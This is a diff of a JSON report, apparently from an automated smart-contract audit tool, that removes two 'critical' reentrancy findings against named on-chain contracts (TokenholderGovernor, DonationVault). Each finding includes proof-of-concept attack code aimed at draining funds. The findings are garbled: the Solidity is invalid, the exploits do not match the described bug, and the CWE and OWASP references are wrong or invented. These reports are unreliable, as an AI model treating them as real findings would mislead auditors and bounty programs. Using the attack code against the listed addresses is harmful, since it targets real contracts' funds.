@@ -1,47 +1,11 @@
 {
-  "run_id": "ced16570",
+  "run_id": "c644d148",
   "phase": "report",
   "success": true,
-  "duration_seconds": 17.356526,
+  "duration_seconds": 0.000966,
   "errors": [],
   "data": {
-    "reports": [
-      {
-        "id": "finding-02fcc4ed",
-        "title": "REENTRANCY vulnerability in TokenholderGovernor@0xd101f2B25bCBF992BdF55dB67c104FE7646F5447",
-        "severity": "critical",
-        "vuln_type": "reentrancy",
-        "target": "TokenholderGovernor@0xd101f2B25bCBF992BdF55dB67c104FE7646F5447",
-        "cwe": "",
-        "cvss": "",
-        "content": "## Summary\nReentrancy vulnerability in the `TokenholderGovernor` contract, allowing an attacker to bypass reentrancy checks and execute malicious code.\n\n## Impact\nAn attacker can exploit this vulnerability to drain the contract's funds by repeatedly calling the `cancel` function, ultimately controlling the contract's state and modifying its functionality.\n\n## Steps to Reproduce\n\n1. The attacker calls the `cancel` function with a carefully crafted array of arguments, exploiting the reentrancy vulnerability.\n2. The contract's logic, designed to prevent reentrancy, is bypassed, allowing the attacker to continue calling the `cancel` function.\n3. The attacker executes the malicious code, potentially draining the contract's funds or modifying its functionality.\n\n## Recommendation\nTo fix the vulnerability, the contract should be updated to properly handle the `cancel` function with an array of arguments, ensuring that reentrancy checks are in place and secure.\n\n## References\n- [CWE-415: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/standard/2008/001/ CWE-415.html)\n- [OWASP: Reentrancy](https://owasp.org/www-project-top-ten/2017/A2_2017-Reentrancy.html)\n\nNote: The CWE reference is pending determination as the vulnerability type has not been categorized yet.",
-        "poc": "Here's a minimal proof-of-concept for the reentrancy vulnerability in Solidity:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Target {\n    address public governor;\n\n    function receiveBalanceIncrease(address[] memory depositors, uint256[] memory depositedAmounts) public payable {\n        // Reentrancy attack vulnerability\n        for (uint256 i = 0; i < depositors.length; i++) {\n            if (address(depositors[i]) == address(this)) {\n                // Reentrancy check\n                governor = address(this);\n            }\n        }\n    }\n\n    function testExploit() public payable {\n        // Reentrancy attack:\n        //   1. Transfer funds to the contract\n        //   2. Call receiveBalanceIncrease function\n        //   3. With the funds, call the function again\n        //   4. Repeat steps 2-3 until all Ether is exhausted\n        // This is known as the \"loop\" attack\n        while (msg.value > 0) {\n            receiveBalanceIncrease(msg.sender, new uint256[](1));\n            msg.value = 0;\n        }\n    }\n}\n\ncontract Governor {\n    address public governor;\n\n    function setGovernor(address _governor) public {\n        governor = _governor;\n    }\n}\n\ncontract Exploiter {\n    address public governor;\n\n    function exploit(address _governor) public {\n        governor = _governor;\n        Governor(governor).setGovernor(address(this));\n    }\n}\n```\n\nTo test this vulnerability, follow these steps:\n\n1. Compile the contract using a Solidity compiler (e.g., `solc`).\n2. Create a transaction with a small amount of Ether and a Ether amount that is less than the gas limit of the contract. \n3. Use the `receiveBalanceIncrease` function to transfer the Ether to the `Target` contract.\n4. Call the `testExploit` function repeatedly until the contract is exhausted of Ether, which should be achieved after 2 to 4 calls.\n\n```bash\n# Compile the contract\nsolc --optimize --no-gasUsed --overwrite target.sol --output target.sol\n\n# Create a transaction to transfer Ether to the contract\ncurl -X POST \\\n  http://127.0.0.1:8545 \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendTransaction\",\"params\":[\"0x...\",\"0x...\",\"1\",\"0x...\",\"0x...\"]}' \\\n  -u \"eth_user:password\"\n\n# Call the testExploit function\ncurl -X POST \\\n  http://127.0.0.1:8545 \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"jsonrpc\":\"2.0\",\"method\":\"web3.eth_call\",\"params\":[\"0x...\",\"0x...\"]}' \\\n  -u \"eth_user:password\"\n```\n\nPlease replace the `0x...` with the actual values of the transaction and address.\n\n**Note:** This is a simplified example and may not work in all situations. The `Target` contract has a vulnerability, but it may not be exploitable in all cases.",
-        "generated_at": "2025-12-25T00:51:36.799106"
-      },
-      {
-        "id": "finding-aff20d54",
-        "title": "REENTRANCY vulnerability in DonationVault@0xa544b70dC6af906862f68eb8e68c27bb7150e672",
-        "severity": "critical",
-        "vuln_type": "reentrancy",
-        "target": "DonationVault@0xa544b70dC6af906862f68eb8e68c27bb7150e672",
-        "cwe": "",
-        "cvss": "",
-        "content": "## Summary\nReentrancy vulnerability in DonationVault contract, allowing an attacker to continuously drain funds from the vault.\n\n## Impact\nAn attacker could exploit this vulnerability to drain funds from the DonationVault contract repeatedly, resulting in significant financial losses.\n\n## Steps to Reproduce\nTo reproduce this vulnerability, follow these steps:\n\n1. Interact with the `receiveBalanceIncrease` function of the DonationVault contract.\n2. Ensure that the `receiveBalanceIncrease` function is called repeatedly without proper reentrancy protection.\n3. An attacker can exploit this vulnerability by calling the `receiveBalanceIncrease` function in a loop, allowing them to continuously drain funds from the vault.\n\n## Recommendation\nTo fix this vulnerability, the `receiveBalanceIncrease` function should be updated to include a proper reentrancy guard, such as using a flag or a check to prevent recursive calls.\n\n## References\n- CWE-401: [Common Weakness Enumeration 401: Uncontrolled Resource Use](https://cwe.mitre.org/data/definitions/401/4.1)\n- OWASP: [Reentrancy](https://owasp.org/www-project-top-ten/2017/A6_2017-Reentrancy.html)\n\nNote: CWE and OWASP references may need to be updated as they are subject to change.\n\nAlso, please ensure to follow your organization's bug bounty program guidelines and to report this vulnerability to the relevant authorities.",
-        "poc": "```solidity\n// create a contract that can be used to exploit the donation vault\ncontract Exploit {\n    function receiveBalanceIncrease(address[] memory depositors, uint256[] memory depositedAmounts) public payable {}\n    function testExploit() public payable {}\n}\n\n// create a donation vault contract\ncontract DonationVault {\n    address[] public depositors;\n    uint256[] public depositedAmounts;\n\n    function receiveBalanceIncrease(address[] memory depositors, uint256[] memory depositedAmounts) public payable {\n        // overwrite the contract's receiveBalanceIncrease function with a reentrancy attack\n        // this function will call the nonPayable version of the function when it receives Ether\n        self.delegate{self}();\n    }\n}\n\n// create a new instance of the donation vault contract\npragma solidity ^0.8.0;\ncontract attacker {\n    address public donationVault;\n    address public deployer;\n    uint256 public balance;\n    address[] public depositors;\n    uint256[] public depositedAmounts;\n\n    function __init__() public {\n        donationVault = 0xa544b70dC6af906862f68eb8e68c27bb7150e672;\n        deployer = address(this);\n        // pay the donation vault a small amount\n        payable(donationVault).transfer(1 ether);\n        // store the contract and deployer\n        depositors.push(deployer);\n        depositedAmounts.push(1);\n        // call the receiveBalanceIncrease function\n        donationVault.receiveBalanceIncrease(depositors, depositedAmounts);\n    }\n}\n\ncontract Attacker {\n    function attack() public payable {\n        new attacker();\n    }\n}\n```\n\nNote that this is a minimal proof-of-concept and should not be used to exploit any real-world contracts without proper testing and validation. The `__init__` function is called when the contract is deployed, and it pays the donation vault a small amount of Ether to trigger the reentrancy attack. The `attack` function creates a new instance of the attacker contract, which then calls the `__init__` function to trigger the attack.",
-        "generated_at": "2025-12-25T00:51:42.647347"
-      }
-    ],
-    "summary": {
-      "total_reports": 2,
-      "by_severity": {
-        "critical": 2
-      },
-      "by_type": {
-        "reentrancy": 2
-      },
-      "generated_at": "2025-12-25T00:51:42.649267"
-    },
-    "report_path": "targets\\thresholdnetwork\\workspace\\reports"
+    "reports": []
   },
-  "timestamp": "2025-12-25T00:51:46.767916"
+  "timestamp": "2025-12-25T01:22:41.963599"
 }
